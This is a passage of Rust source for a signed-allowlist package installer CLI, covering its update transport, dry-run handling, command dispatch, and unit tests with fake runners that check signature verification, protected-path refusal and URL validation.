            &format!("{}/{channel}.json", self.base),
            pos_update::MAX_ENVELOPE_BYTES as u64,
        )
    }
    fn fetch_artifact<'a>(
        &'a mut self,
        _channel: &str,
        artifact: &pos_update::Artifact,
    ) -> std::io::Result<Box<dyn std::io::Read + 'a>> {
        let bytes = self
            .http
            .get(&format!("{}/{}", self.base, artifact.name), artifact.size)?;
        if bytes.len() as u64 != artifact.size {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!(
                    "artifact {}: manifest says {} bytes, server sent {}",
                    artifact.name,
                    artifact.size,
                    bytes.len()
                ),
            ));
        }
        Ok(Box::new(std::io::Cursor::new(bytes)))
    }
}

/// The one configured update transport.
enum AnyTransport {
    Dir(DirTransport),
    Url(UrlTransport),
}

impl pos_update::flow::Transport for AnyTransport {
    fn fetch_manifest(&mut self, channel: &str) -> std::io::Result<Vec<u8>> {
        match self {
            Self::Dir(t) => t.fetch_manifest(channel),
            Self::Url(t) => t.fetch_manifest(channel),
        }
    }
    fn fetch_artifact<'a>(
        &'a mut self,
        channel: &str,
        artifact: &pos_update::Artifact,
    ) -> std::io::Result<Box<dyn std::io::Read + 'a>> {
        match self {
            Self::Dir(t) => t.fetch_artifact(channel, artifact),
            Self::Url(t) => t.fetch_artifact(channel, artifact),
        }
    }
}

/// Resolves the exactly-one-of --transport-dir / --transport-url rule and
/// builds the transport.
fn build_transport(a: &UpdateArgs) -> Result<AnyTransport, String> {
    match (&a.transport_dir, &a.transport_url) {
        (Some(dir), None) => Ok(AnyTransport::Dir(DirTransport { dir: dir.clone() })),
        (None, Some(url)) => {
            let base = validate_transport_url(url)?;
            Ok(AnyTransport::Url(UrlTransport {
                base,
                http: Box::new(UreqGet::new()),
            }))
        }
        (Some(_), Some(_)) => {
            Err("pass exactly one of --transport-dir or --transport-url, not both".to_string())
        }
        (None, None) => Err("pass one of --transport-dir or --transport-url".to_string()),
    }
}

/// The message PlanHandoff returns so the flow unwinds without installing or
/// persisting state. Compared exactly, never parsed.
const UPDATE_DRY_RUN_SENTINEL: &str = "dry-run: verified and staged, nothing installed";

/// Dry-run handoff: records what a real run would install, then stops the
/// flow. run_update treats the error as a handoff failure: no state is
/// persisted and the staged files are cleaned up.
struct PlanHandoff {
    planned: Vec<String>,
}

impl pos_update::flow::Handoff for PlanHandoff {
    fn handoff(
        &mut self,
        _verified: &pos_update::Verified,
        staged: &pos_update::flow::StagedUpdate,
    ) -> Result<(), pos_update::flow::HandoffError> {
        for f in &staged.files {
            if let Some(base) = f.name.strip_suffix(pos_update_install::DEB_SUFFIX) {
                let list = format!("{base}{}", pos_update_install::ALLOWLIST_SUFFIX);
                if staged.files.iter().any(|g| g.name == list) {
                    self.planned
                        .push(format!("{} (authorized by {list})", f.name));
                } else {
                    self.planned.push(format!(
                        "{} (NO paired {list}; a real run would refuse it)",
                        f.name
                    ));
                }
            }
        }
        Err(pos_update::flow::HandoffError(
            UPDATE_DRY_RUN_SENTINEL.into(),
        ))
    }
}

fn cmd_update<R: pos_gate::linux_backend::CommandRunner>(runner: R, a: UpdateArgs) -> ExitCode {
    use pos_update::flow::{run_update, FlowError, Options, Outcome};
    let raw = match read_json(&a.update_keys) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(4);
        }
    };
    let parsed: UpdateKeysFile = match serde_json::from_slice(&raw) {
        Ok(p) => p,
        Err(e) => {
            eprintln!(
                "error: {}: not an update-keys file: {e}",
                a.update_keys.display()
            );
            return ExitCode::from(4);
        }
    };
    if a.threshold == 0 || a.threshold > parsed.keys.len() {
        eprintln!("error: --threshold must be between 1 and the number of update keys");
        return ExitCode::from(4);
    }
    let mut keys = Vec::with_capacity(parsed.keys.len());
    for k in &parsed.keys {
        let pk: [u8; 32] = match hex::decode(&k.public_key_hex)
            .ok()
            .and_then(|v| v.try_into().ok())
        {
            Some(p) => p,
            None => {
                eprintln!(
                    "error: update key {}: public_key_hex is not 32 bytes of hex",
                    k.key_id
                );
                return ExitCode::from(4);
            }
        };
        keys.push(pos_update::TrustedKey {
            key_id: k.key_id.clone(),
            public_key: pk,
            valid_from: k.valid_from,
            valid_until: k.valid_until,
            retired: k.retired,
        });
    }
    let now = now_secs();
    let policy = pos_update::VerifyPolicy::new(&keys, a.threshold, now, &a.channel);
    if let Err(e) = std::fs::create_dir_all(&a.update_state_dir) {
        eprintln!("error: cannot create {}: {e}", a.update_state_dir.display());
        return ExitCode::from(4);
    }
    let mut store = match pos_update::file_state::FileStateStore::acquire(
        &a.update_state_dir,
        &a.channel,
        std::time::Duration::from_secs(5),
    ) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("error: update state for channel {}: {e}", a.channel);
            return ExitCode::from(2);
        }
    };
    let mut transport = match build_transport(&a) {
        Ok(t) => t,
        Err(msg) => {
            eprintln!("error: {msg}");
            return ExitCode::from(4);
        }
    };
    let mut sr = a.state.clone().into_os_string();
    sr.push(".update-staging");
    let stage_root = PathBuf::from(sr);
    let opts = Options::default();

    if a.dry_run {
        let mut hand = PlanHandoff {
            planned: Vec::new(),
        };
        return match run_update(
            &a.channel,
            &policy,
            &mut transport,
            &mut store,
            &mut hand,
            &stage_root,
            &opts,
        ) {
            Ok(Outcome::AlreadyCurrent { sequence }) => {
                println!(
                    "channel {} is already at sequence {sequence}; nothing to do",
                    a.channel
                );
                ExitCode::SUCCESS
            }
            Err(FlowError::Handoff(e)) if e.0 == UPDATE_DRY_RUN_SENTINEL => {
                if hand.planned.is_empty() {
                    println!("dry-run: update verified and staged; no .deb artifacts to install");
                } else {
                    println!("dry-run: update verified and staged; a real run would install:");
                    for p in &hand.planned {
                        println!("  {p}");
                    }
                }
                println!("nothing was installed and no state was persisted");
                ExitCode::SUCCESS
            }
            Ok(Outcome::Applied { .. }) => {
                eprintln!("error: internal: dry-run handoff reported success");
                ExitCode::from(2)
            }
            Err(e) => {
                eprintln!("update failed: {e}");
                ExitCode::from(2)
            }
        };
    }

    let kr_bytes = match read_json(&a.keyring) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: {e}");
            return ExitCode::from(4);
        }
    };
    let keyring = match Keyring::from_json(&kr_bytes) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("error: {}: {e}", a.keyring.display());
            return ExitCode::from(4);
        }
    };
    let backend = pos_gate::linux_backend::AptDpkgBackend::new(runner);
    let paths = pos_install::InstallPaths::new(&a.state, &a.audit_log);
    let mut hand = pos_update_install::InstallHandoff::new(
        paths,
        backend,
        pos_gate::rollback::StdFileOps,
        keyring,
        now as i64,
    );
    match run_update(
        &a.channel,
        &policy,
        &mut transport,
        &mut store,
        &mut hand,
        &stage_root,
        &opts,
    ) {
        Ok(Outcome::AlreadyCurrent { sequence }) => {
            println!(
                "channel {} is already at sequence {sequence}; nothing to do",
                a.channel
            );
            ExitCode::SUCCESS
        }
        Ok(Outcome::Applied {
            sequence,
            cleanup_complete,
        }) => {
            println!(
                "update applied: channel {} is now at sequence {sequence}",
                a.channel
            );
            if !cleanup_complete {
                println!("note: some staged files could not be removed; they are left in place, never deleted here");
            }
            ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("update failed: {e}");
            ExitCode::from(2)
        }
    }
}

fn main() -> ExitCode {
    // try_parse returns Err for usage errors; clap prints and we map to 4.
    let cli = match Cli::try_parse() {
        Ok(c) => c,
        Err(e) => {
            // clap already prints help/version to stdout for --help/--version;
            // for genuine usage errors it prints to stderr. Map both to 4
            // except --help/--version, which clap marks with use_stderr()=false.
            let usage = e.use_stderr();
            let _ = e.print();
            return if usage {
                ExitCode::from(4)
            } else {
                ExitCode::SUCCESS
            };
        }
    };

    match cli.cmd {
        Cmd::Verify {
            allowlist,
            keyring,
            state,
        } => cmd_verify(allowlist, keyring, state),
        Cmd::Install {
            package,
            allowlist,
            keyring,
            dry_run,
            state,
            package_file,
            audit_log,
            recover,
        } => cmd_install(InstallArgs {
            package,
            allowlist,
            keyring,
            dry_run,
            state,
            package_file,
            audit_log,
            recover,
        }),
        Cmd::AllowlistMigrate {
            from_v1,
            trusted_key,
            sha256_map,
            out,
        } => cmd_migrate(from_v1, trusted_key, sha256_map, out),
        Cmd::Sign {
            allowlist,
            private_key,
            out,
        } => cmd_sign(allowlist, private_key, out),
        Cmd::ReviewCheck {
            deb,
            sha256,
            name,
            version,
        } => cmd_review_check(deb, sha256, name, version),
        Cmd::StorePublish {
            deb,
            submission_sha256,
            keyring,
            key_id,
            sequence,
            lifetime_days,
            out,
        } => cmd_store_publish(
            deb,
            submission_sha256,
            keyring,
            key_id,
            sequence,
            lifetime_days,
            out,
        ),
        Cmd::Keygen { out } => cmd_keygen(out),
        Cmd::Audit { action } => cmd_audit(action),
        Cmd::Update {
            channel,
            transport_dir,
            transport_url,
            update_keys,
            threshold,
            keyring,
            state,
            audit_log,
            update_state_dir,
            dry_run,
        } => cmd_update(
            ProcessRunner,
            UpdateArgs {
                channel,
                transport_dir,
                transport_url,
                update_keys,
                threshold,
                keyring,
                state,
                audit_log,
                update_state_dir,
                dry_run,
            },
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    // PROTECTED_DIRS are Linux system paths; Windows path parsing does not
    // match them lexically, so this test only makes sense on unix.
    #[cfg(unix)]
    #[test]
    fn protected_dirs_are_refused_even_when_nothing_exists_there() {
        for p in [
            "/etc/passaura/allowlist.json",
            "/var/lib/passaura/allowlist.json",
            "/usr/share/passaura/new.json",
            "/etc/passaura/sub/dir/new.json",
            "/tmp/x/../../etc/passaura/allowlist.json",
        ] {
            let e = check_new_output(Path::new(p), &[]).unwrap_err();
            assert!(e.contains("protected"), "{p}: {e}");
        }
    }

    #[test]
    fn normal_new_path_is_allowed_and_existing_or_input_paths_are_not() {
        let dir = std::env::temp_dir().join(format!("pos-cli-out-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let fresh = dir.join("new.json");
        assert!(check_new_output(&fresh, &[]).is_ok());
        std::fs::write(&fresh, b"x").unwrap();
        assert!(check_new_output(&fresh, &[])
            .unwrap_err()
            .contains("already exists"));
        assert!(check_new_output(&dir.join("missing-dir/new.json"), &[]).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ---- exact-file install flow with a FAKE runner. The real ProcessRunner
    // is never constructed here, so no apt-get/dpkg is ever run by tests. ----
    mod flow {
        use super::*;
        use ed25519_dalek::Signer;
        use pos_gate::linux_backend::{CommandOutput, CommandRunner, RUNNER_NOT_STARTED_PREFIX};
        use sha2::{Digest, Sha256};
        use std::sync::{Arc, Mutex};

        fn content() -> Vec<u8> {
            pos_gate::deb_identity::build_minimal_deb("ripgrep", "14")
        }

        type Calls = Arc<Mutex<Vec<(String, Vec<String>)>>>;
        type Script = Arc<Mutex<Vec<Result<CommandOutput, String>>>>;
        #[derive(Clone)]
        struct Fake {
            calls: Calls,
            script: Script,
        }
        impl Fake {
            fn new(script: Vec<Result<CommandOutput, String>>) -> Self {
                Fake {
                    calls: Default::default(),
                    script: Arc::new(Mutex::new(script)),
                }
            }
            fn n(&self) -> usize {
                self.calls.lock().unwrap().len()
            }
        }
        impl CommandRunner for Fake {
            fn run(&mut self, p: &str, a: &[String]) -> Result<CommandOutput, String> {
                self.calls.lock().unwrap().push((p.to_string(), a.to_vec()));
                let mut s = self.script.lock().unwrap();
                if s.is_empty() {
                    panic!("unexpected extra command run");
                }
                s.remove(0)
            }
        }
        fn ok() -> Result<CommandOutput, String> {
            Ok(CommandOutput {
                success: true,
                code: Some(0),
                message: String::new(),
            })
        }
        fn exit(code: i32) -> Result<CommandOutput, String> {
            Ok(CommandOutput {
                success: false,
                code: Some(code),
                message: "dpkg: error".into(),
            })
        }

        struct Env {
            dir: std::path::PathBuf,
        }
        impl Env {
            fn new(tag: &str) -> Env {
                let dir =
                    std::env::temp_dir().join(format!("pos-cli-flow-{}-{tag}", std::process::id()));
                let _ = std::fs::remove_dir_all(&dir);
                std::fs::create_dir_all(&dir).unwrap();
                std::fs::write(dir.join("p.deb"), content()).unwrap();
                let sk = ed25519_dalek::SigningKey::from_bytes(&[9u8; 32]);
                let pk = hex::encode(sk.verifying_key().to_bytes());
                let kid = pos_gate::allowlist_v2::derive_key_id(&pk);
                let now = now_secs() as i64;
                let mut doc = pos_gate::allowlist_v2::V2Allowlist {
                    format: "passaura-allowlist".into(),
                    version: 2,
                    sequence: 4,
                    issued_at: now - 100,
                    expires_at: now + 86_400,
                    signed_by: kid.clone(),
                    keyring: pos_gate::allowlist_v2::V2Keyring {
                        keys: vec![pos_gate::allowlist_v2::V2Key {
                            key_id: kid.clone(),
                            public_key_hex: pk.clone(),
                            valid_from: 0,
                            valid_until: now + 86_400,
                            retired: false,
                        }],
                    },
                    entries: vec![pos_gate::allowlist_v2::V2Entry {
                        name: "ripgrep".into(),
                        version: Some("14".into()),
                        sha256: hex::encode(Sha256::digest(content())),
                    }],
                    signature_hex: String::new(),
                };
                let payload = pos_gate::allowlist_v2::canonical_payload_bytes(&doc).unwrap();
                doc.signature_hex = hex::encode(sk.sign(&payload).to_bytes());
                std::fs::write(dir.join("al.json"), serde_json::to_vec(&doc).unwrap()).unwrap();
                let kr = serde_json::json!({"keys":[{"key_id": kid, "public_key_hex": pk}]});
                std::fs::write(dir.join("kr.json"), kr.to_string()).unwrap();
                Env { dir }
            }
            fn args(&self, dry_run: bool, recover: Option<RecoverMode>) -> InstallArgs {
                InstallArgs {
                    package: "ripgrep".into(),
                    allowlist: self.dir.join("al.json"),
                    keyring: self.dir.join("kr.json"),
                    dry_run,
                    state: Some(self.dir.join("state.json")),
                    package_file: Some(self.dir.join("p.deb")),
                    audit_log: Some(self.dir.join("audit.log")),
                    recover,
                }
            }
            fn seq(&self) -> Option<u64> {
                pos_gate::rollback::RollbackStore::read_state_readonly(self.dir.join("state.json"))
                    .unwrap()
                    .map(|r| r.last_seq)
            }
            fn journal(&self) -> bool {
                pos_install::pipeline::journal_present(&self.dir.join("state.json"))
            }
        }
        impl Drop for Env {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.dir);
            }
        }
        fn code(c: ExitCode) -> String {
            format!("{c:?}")
        }

        #[test]
        fn success_runs_dpkg_once_on_the_staged_file_and_records_sequence() {
            let e = Env::new("ok");
            let f = Fake::new(vec![ok()]);
            assert_eq!(
                code(run_pipeline_install(f.clone(), e.args(false, None))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(e.seq(), Some(4));
            assert!(!e.journal());
            let calls = f.calls.lock().unwrap();
            assert_eq!(calls.len(), 1);
            assert_eq!(calls[0].0, "dpkg");
            assert_eq!(&calls[0].1[..2], &["-i".to_string(), "--".to_string()]);
        }

        #[test]
        fn dry_run_runs_nothing_and_creates_no_state_audit_journal_or_lock() {
            let e = Env::new("dry");
            let f = Fake::new(vec![]);
            assert_eq!(
                code(run_pipeline_install(f.clone(), e.args(true, None))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 0);
            for n in [
                "state.json",
                "audit.log",
                "state.json.lock",
                "state.json.install-journal",
                "state.json.stage",
            ] {
                assert!(!e.dir.join(n).exists(), "{n} must not exist");
            }
        }

        #[test]
        fn nonzero_exit_exit2_sequence_unchanged() {
            let e = Env::new("nz");
            let f = Fake::new(vec![exit(100)]);
            assert_eq!(
                code(run_pipeline_install(f, e.args(false, None))),
                code(ExitCode::from(2))
            );
            assert_ne!(e.seq(), Some(4));
            assert!(!e.journal());
        }

        #[test]
        fn proven_not_started_is_definite_failure() {
            let e = Env::new("ns");
            let f = Fake::new(vec![Err(format!(
                "{RUNNER_NOT_STARTED_PREFIX}spawn failed"
            ))]);
            assert_eq!(
                code(run_pipeline_install(f, e.args(false, None))),
                code(ExitCode::from(2))
            );
            assert!(!e.journal());
            assert_ne!(e.seq(), Some(4));
        }

        #[test]
        fn unknown_outcome_blocks_then_retry_succeeds() {
            let e = Env::new("unk");
            let f = Fake::new(vec![Err("wait/read failed after spawn: x".into()), ok()]);
            assert_eq!(
                code(run_pipeline_install(f.clone(), e.args(false, None))),
                code(ExitCode::from(2))
            );
            assert!(e.journal());
            assert_ne!(e.seq(), Some(4));
            // A plain install is refused and runs nothing.
            assert_eq!(
                code(run_pipeline_install(f.clone(), e.args(false, None))),
                code(ExitCode::from(2))
            );
            assert_eq!(f.n(), 1);
            // Explicit retry runs once more and commits.
            assert_eq!(
                code(run_pipeline_install(
                    f.clone(),
                    e.args(false, Some(RecoverMode::Retry))
                )),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 2);
            assert_eq!(e.seq(), Some(4));
            assert!(!e.journal());
        }

        #[test]
        fn unknown_outcome_then_abandon_runs_nothing_and_unblocks() {
            let e = Env::new("ab");
            let f = Fake::new(vec![Err("wait failed".into()), ok()]);
            let _ = run_pipeline_install(f.clone(), e.args(false, None));
            assert!(e.journal());
            assert_eq!(
                code(run_pipeline_install(
                    f.clone(),
                    e.args(false, Some(RecoverMode::Abandon))
                )),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 1);
            assert!(!e.journal());
            assert_ne!(e.seq(), Some(4));
            // New install is allowed after abandon.
            assert_eq!(
                code(run_pipeline_install(f.clone(), e.args(false, None))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(e.seq(), Some(4));
        }

        #[test]
        fn retry_and_abandon_without_a_journal_run_nothing_and_exit2() {
            let e = Env::new("nj");
            let f = Fake::new(vec![]);
            for m in [RecoverMode::Retry, RecoverMode::Abandon] {
                assert_eq!(
                    code(run_pipeline_install(f.clone(), e.args(false, Some(m)))),
                    code(ExitCode::from(2))
                );
            }
            assert_eq!(f.n(), 0);
        }

        #[test]
        fn torn_journal_fails_closed_for_install_retry_and_abandon() {
            let e = Env::new("torn");
            let f = Fake::new(vec![Err("wait failed".into())]);
            let _ = run_pipeline_install(f.clone(), e.args(false, None));
            let jp = e.dir.join("state.json.install-journal");
            let mut b = std::fs::read(&jp).unwrap();
            assert_eq!(b.pop(), Some(b'\n'));
            b.truncate(b.len() - 3);
            std::fs::write(&jp, &b).unwrap();
            for m in [None, Some(RecoverMode::Retry), Some(RecoverMode::Abandon)] {
                assert_eq!(
                    code(run_pipeline_install(f.clone(), e.args(false, m))),
                    code(ExitCode::from(2))
                );
            }
            assert_eq!(f.n(), 1, "nothing may run");
            assert_eq!(
                std::fs::read(&jp).unwrap(),
                b,
                "journal must be left untouched"
            );
            let msg = format!(
                "{}",
                pos_install::InstallError::Journal(pos_install::journal::JournalError::Corrupt(
                    "x".into()
                ))
            );
            assert!(
                msg.contains("dpkg --audit") && msg.contains("Do NOT delete"),
                "{msg}"
            );
        }

        #[test]
        fn pipeline_paths_need_state_and_audit_log() {
            let e = Env::new("use");
            let f = Fake::new(vec![]);
            let mut a = e.args(false, None);
            a.audit_log = None;
            assert_eq!(
                code(run_pipeline_install(f.clone(), a)),
                code(ExitCode::from(4))
            );
            let mut a = e.args(false, Some(RecoverMode::Abandon));
            a.state = None;
            assert_eq!(
                code(run_pipeline_install(f.clone(), a)),
                code(ExitCode::from(4))
            );
            assert_eq!(
                code(run_pipeline_install(
                    f,
                    e.args(true, Some(RecoverMode::Retry))
                )),
                code(ExitCode::from(4))
            );
        }

        #[test]
        fn not_allowed_is_exit3_and_runs_nothing() {
            let e = Env::new("na");
            let f = Fake::new(vec![]);
            let mut a = e.args(false, None);
            a.package = "nmap".into();
            assert_eq!(
                code(run_pipeline_install(f.clone(), a)),
                code(ExitCode::from(3))
            );
            assert_eq!(f.n(), 0);
        }
    }

    // ---- update command, with a FAKE runner so no dpkg ever runs. ----
    mod update {
        use super::*;
        use ed25519_dalek::Signer;
        use pos_gate::linux_backend::{CommandOutput, CommandRunner};
        use sha2::{Digest, Sha256};
        use std::sync::{Arc, Mutex};

        const PKG: &str = "ripgrep";
        const VER: &str = "14";
        const CHANNEL: &str = "stable";
        const UPDATE_KEY_ID: &str = "update-key-1";

        type Calls = Arc<Mutex<Vec<(String, Vec<String>)>>>;
        #[derive(Clone, Default)]
        struct Fake {
            calls: Calls,
        }
        impl CommandRunner for Fake {
            fn run(&mut self, p: &str, a: &[String]) -> Result<CommandOutput, String> {
                self.calls.lock().unwrap().push((p.to_string(), a.to_vec()));
                Ok(CommandOutput {
                    success: true,
                    code: Some(0),
                    message: String::new(),
                })
            }
        }
        impl Fake {
            fn n(&self) -> usize {
                self.calls.lock().unwrap().len()
            }
        }

        fn sha(b: &[u8]) -> String {
            hex::encode(Sha256::digest(b))
        }

        struct Env {
            dir: std::path::PathBuf,
            update_sk: ed25519_dalek::SigningKey,
            install_kr_path: PathBuf,
        }

        impl Env {
            fn new(tag: &str) -> Env {
                let dir = std::env::temp_dir()
                    .join(format!("pos-cli-update-{}-{tag}", std::process::id()));
                let _ = std::fs::remove_dir_all(&dir);
                std::fs::create_dir_all(dir.join("transport")).unwrap();
                std::fs::create_dir_all(dir.join("ustate")).unwrap();

                // Install side: signed v2 allowlist for the deb, and its keyring.
                let deb = pos_gate::deb_identity::build_minimal_deb(PKG, VER);
                let install_sk = ed25519_dalek::SigningKey::from_bytes(&[9u8; 32]);
                let ipk = hex::encode(install_sk.verifying_key().to_bytes());
                let ikid = pos_gate::allowlist_v2::derive_key_id(&ipk);
                let now = now_secs() as i64;
                let mut doc = pos_gate::allowlist_v2::V2Allowlist {
                    format: "passaura-allowlist".into(),
                    version: 2,
                    sequence: 4,
                    issued_at: now - 100,
                    expires_at: now + 86_400,
                    signed_by: ikid.clone(),
                    keyring: pos_gate::allowlist_v2::V2Keyring {
                        keys: vec![pos_gate::allowlist_v2::V2Key {
                            key_id: ikid.clone(),
                            public_key_hex: ipk.clone(),
                            valid_from: 0,
                            valid_until: now + 86_400,
                            retired: false,
                        }],
                    },
                    entries: vec![pos_gate::allowlist_v2::V2Entry {
                        name: PKG.into(),
                        version: Some(VER.into()),
                        sha256: sha(&deb),
                    }],
                    signature_hex: String::new(),
                };
                let payload = pos_gate::allowlist_v2::canonical_payload_bytes(&doc).unwrap();
                doc.signature_hex = hex::encode(install_sk.sign(&payload).to_bytes());
                let al_bytes = serde_json::to_vec(&doc).unwrap();

                // Transport dir: the two artifacts.
                std::fs::write(dir.join("transport/p.deb"), &deb).unwrap();
                std::fs::write(dir.join("transport/p.allowlist.json"), &al_bytes).unwrap();

                let kr = serde_json::json!({"keys":[{"key_id": ikid, "public_key_hex": ipk}]});
                let install_kr_path = dir.join("kr.json");
                std::fs::write(&install_kr_path, kr.to_string()).unwrap();

                // Update side: one trusted update key, threshold 1.
                let update_sk = ed25519_dalek::SigningKey::from_bytes(&[5u8; 32]);
                let upk = hex::encode(update_sk.verifying_key().to_bytes());
                let uk = serde_json::json!({"keys":[{
                    "key_id": UPDATE_KEY_ID,
                    "public_key_hex": upk,
                    "valid_from": 0,
                    "valid_until": now + 86_400,
                    "retired": false
                }]});
                std::fs::write(dir.join("update-keys.json"), uk.to_string()).unwrap();
                Env {
                    dir,
                    update_sk,
                    install_kr_path,
                }
            }

            /// Writes a signed envelope for a manifest covering the two artifacts.
            fn write_envelope(&self, sequence: u64, wrong_key: bool) {
                let now = now_secs();
                let artifacts = ["p.deb", "p.allowlist.json"]
                    .iter()
                    .map(|n| {
                        let b = std::fs::read(self.dir.join("transport").join(n)).unwrap();
                        pos_update::Artifact {
                            name: n.to_string(),
                            version: VER.into(),
                            sha256: sha(&b),
                            size: b.len() as u64,
                        }
                    })
                    .collect();
                let m = pos_update::Manifest {
                    format: pos_update::FORMAT.into(),
                    channel: CHANNEL.into(),
                    sequence,
                    issued_at: now - 10,
                    expires_at: now + 3600,
                    artifacts,
                };
                let bytes = pos_update::signed_bytes(&m).unwrap();
                let sk = if wrong_key {
                    ed25519_dalek::SigningKey::from_bytes(&[6u8; 32])
                } else {
                    self.update_sk.clone()
                };
                let env = pos_update::Envelope {
                    manifest: m,
                    signatures: vec![pos_update::SignatureEntry {
                        key_id: UPDATE_KEY_ID.into(),
                        sig_hex: hex::encode(sk.sign(&bytes).to_bytes()),
                    }],
                };
                std::fs::write(
                    self.dir.join(format!("transport/{CHANNEL}.json")),
                    serde_json::to_vec(&env).unwrap(),
                )
                .unwrap();
            }

            fn args(&self, dry_run: bool) -> UpdateArgs {
                UpdateArgs {
                    channel: CHANNEL.into(),
                    transport_dir: Some(self.dir.join("transport")),
                    transport_url: None,
                    update_keys: self.dir.join("update-keys.json"),
                    threshold: 1,
                    keyring: self.install_kr_path.clone(),
                    state: self.dir.join("state.json"),
                    audit_log: self.dir.join("audit.log"),
                    update_state_dir: self.dir.join("ustate"),
                    dry_run,
                }
            }

            fn install_seq(&self) -> Option<u64> {
                pos_gate::rollback::RollbackStore::read_state_readonly(self.dir.join("state.json"))
                    .unwrap()
                    .map(|r| r.last_seq)
            }
        }

        fn code(c: ExitCode) -> String {
            format!("{c:?}")
        }

        #[test]
        fn real_run_installs_through_the_whole_stack_and_persists_both_states() {
            let e = Env::new("rr");
            e.write_envelope(1, false);
            let f = Fake::default();
            assert_eq!(
                code(cmd_update(f.clone(), e.args(false))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 1, "exactly one dpkg command planned and run");
            assert_eq!(f.calls.lock().unwrap()[0].0, "dpkg");
            assert_eq!(e.install_seq(), Some(4), "allowlist sequence persisted");
            // Second run: the persisted update state makes it AlreadyCurrent.
            assert_eq!(
                code(cmd_update(f.clone(), e.args(false))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 1, "no second install for an already-current channel");
        }

        #[test]
        fn dry_run_installs_and_persists_nothing() {
            let e = Env::new("dr");
            e.write_envelope(1, false);
            let f = Fake::default();
            assert_eq!(
                code(cmd_update(f.clone(), e.args(true))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 0);
            assert_eq!(e.install_seq(), None);
            // Nothing persisted: a real run afterwards still installs.
            assert_eq!(
                code(cmd_update(f.clone(), e.args(false))),
                code(ExitCode::SUCCESS)
            );
            assert_eq!(f.n(), 1);
        }

        #[test]
        fn wrong_update_signature_is_refused_and_runs_nothing() {
            let e = Env::new("bad");
            e.write_envelope(1, true);
            let f = Fake::default();
            assert_eq!(
                code(cmd_update(f.clone(), e.args(false))),
                code(ExitCode::from(2))
            );
            assert_eq!(f.n(), 0);
            assert_eq!(e.install_seq(), None);
        }

        #[test]
        fn deb_without_paired_allowlist_is_refused_and_runs_nothing() {
            let e = Env::new("np");
            std::fs::remove_file(e.dir.join("transport/p.allowlist.json")).unwrap();
            // Manifest covers only the deb now.
            let b = std::fs::read(e.dir.join("transport/p.deb")).unwrap();
            let now = now_secs();
            let m = pos_update::Manifest {
                format: pos_update::FORMAT.into(),
                channel: CHANNEL.into(),
                sequence: 1,
                issued_at: now - 10,
                expires_at: now + 3600,
                artifacts: vec![pos_update::Artifact {
                    name: "p.deb".into(),
                    version: VER.into(),
                    sha256: sha(&b),
                    size: b.len() as u64,
                }],
            };
            let bytes = pos_update::signed_bytes(&m).unwrap();
            let env = pos_update::Envelope {
                manifest: m,
                signatures: vec![pos_update::SignatureEntry {
                    key_id: UPDATE_KEY_ID.into(),
                    sig_hex: hex::encode(e.update_sk.sign(&bytes).to_bytes()),
                }],
            };
            std::fs::write(
                e.dir.join(format!("transport/{CHANNEL}.json")),
                serde_json::to_vec(&env).unwrap(),
            )
            .unwrap();
            let f = Fake::default();
            assert_eq!(
                code(cmd_update(f.clone(), e.args(false))),
                code(ExitCode::from(2))
            );
            assert_eq!(f.n(), 0);
            assert_eq!(e.install_seq(), None);
        }
    }
}

#[cfg(test)]
mod url_transport_tests {
    use super::*;
    use pos_update::flow::Transport;
    use std::collections::HashMap;
    use std::io::Read as _;

    struct FakeHttp {
        bodies: HashMap<String, Vec<u8>>,
    }

    impl HttpGet for FakeHttp {
        fn get(&mut self, url: &str, max_bytes: u64) -> std::io::Result<Vec<u8>> {
            let body = self
                .bodies
                .get(url)
                .cloned()
                .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "404"))?;
            if body.len() as u64 > max_bytes {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "body over limit",
                ));
            }
            Ok(body)
        }
    }

    fn artifact(name: &str, size: u64) -> pos_update::Artifact {
        pos_update::Artifact {
            name: name.to_string(),
            version: "0".to_string(),
            sha256: "0".repeat(64),
            size,
        }
    }

    #[test]
    fn url_validation() {
        assert!(validate_transport_url("http://updates.example.com").is_err());
        assert!(validate_transport_url("updates.example.com").is_err());
        assert!(validate_transport_url("https://user:pw@updates.example.com").is_err());
        assert!(validate_transport_url("https://updates.example.com/?key=1").is_err());
        assert!(validate_transport_url("https://updates.example.com/#frag").is_err());
        assert!(validate_transport_url("https:///path").is_err());
        assert_eq!(
            validate_transport_url("https://updates.example.com/pos/").unwrap(),
            "https://updates.example.com/pos"
        );
        assert_eq!(
            validate_transport_url("https://updates.example.com:8443").unwrap(),
            "https://updates.example.com:8443"
        );
    }

    #[test]
    fn url_transport_fetches_manifest_and_artifact() {
        let mut bodies = HashMap::new();
        bodies.insert("https://u.example/stable.json".to_string(), b"{}".to_vec());
        bodies.insert(
            "https://u.example/app.deb".to_string(),
            b"deb-bytes".to_vec(),
        );
        let mut t = UrlTransport {
            base: "https://u.example".to_string(),
            http: Box::new(FakeHttp { bodies }),
        };
        assert_eq!(t.fetch_manifest("stable").unwrap(), b"{}");
        let a = artifact("app.deb", 9);
        let mut buf = Vec::new();
        t.fetch_artifact("stable", &a)
            .unwrap()
            .read_to_end(&mut buf)
            .unwrap();
        assert_eq!(buf, b"deb-bytes");
    }

    #[test]
    fn url_transport_rejects_size_mismatch_and_over_limit() {
        let mut bodies = HashMap::new();
        bodies.insert("https://u.example/app.deb".to_string(), b"short".to_vec());
